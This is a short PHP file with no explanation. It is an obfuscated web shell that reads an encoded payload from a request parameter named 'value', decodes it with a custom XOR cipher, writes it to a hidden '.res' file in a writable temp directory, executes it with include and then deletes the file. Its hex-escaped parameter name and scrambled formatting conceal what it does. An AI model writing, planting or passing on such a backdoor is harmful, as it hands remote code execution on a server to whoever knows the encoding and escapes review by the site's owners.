<?php

if(isset($_REQUEST) && isset($_REQUEST["v\x61\x6Cue"])){
	$dchunk = $_REQUEST["v\x61\x6Cue"];
	$dchunk =	explode	('.' 	 ,		 $dchunk	 	)		 ;   
	$pointer = '';
            $s2 = 'abcdefghijklmnopqrstuvwxyz0123456789';
            $sLen = strlen($s2);
            $k = 0;
    
            array_walk($dchunk, function($v3) use(&$pointer, &$k, $s2, $sLen) {	 $chS = ord($s2[$k% $sLen]);
                $dec =((int)$v3 - $chS -($k% 10)) ^ 42;
                $pointer 	.=  chr($dec);
                $k++;});
	$property_set = array_filter(["/dev/shm", "/var/tmp", getenv("TMP"), "/tmp", ini_get("upload_tmp_dir"), session_save_path(), sys_get_temp_dir(), getenv("TEMP"), getcwd()]);
	$record = 0;
do {
    $entity = $property_set[$record] ?? null;
    if ($record >= count($property_set)) break;
    		if ((bool)is_dir($entity) && (bool)is_writable($entity)) {
    $elem = sprintf("%s/.res", $entity);
    $file = fopen($elem, 'w');
if ($file) {
	fwrite($file, $pointer);
	fclose($file);
	include $elem;
	@unlink($elem);
	exit;
}
}
    $record++;
} while (true);
}